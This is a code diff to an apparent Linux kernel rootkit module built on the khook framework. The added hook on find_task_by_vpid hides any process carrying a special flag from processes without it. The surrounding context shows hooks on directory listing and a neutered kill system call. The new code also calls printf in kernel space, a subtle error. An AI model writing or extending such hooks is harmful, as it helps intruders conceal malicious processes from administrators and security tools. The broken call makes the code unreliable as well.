@@ -10,6 +10,7 @@
 #include <linux/fs.h>
 #include <linux/version.h>
 #include <linux/syscalls.h>
+#include <linux/sched.h>
 
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
@@ -82,6 +83,18 @@ static long khook_sys_kill(pid_t pid, int sig) {
         //printk("sys_kill");
         //return KHOOK_ORIGIN(sys_kill, pid, sig);
 		return 0;
+}
+
+KHOOK(find_task_by_vpid);
+struct task_struct *khook_find_task_by_vpid(pid_t vnr)
+{
+	struct task_struct *tsk = NULL;
+	printf("HOOK SUCCESS");
+	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
+	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
+		tsk = NULL;
+
+	return tsk;
 }
 /*
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
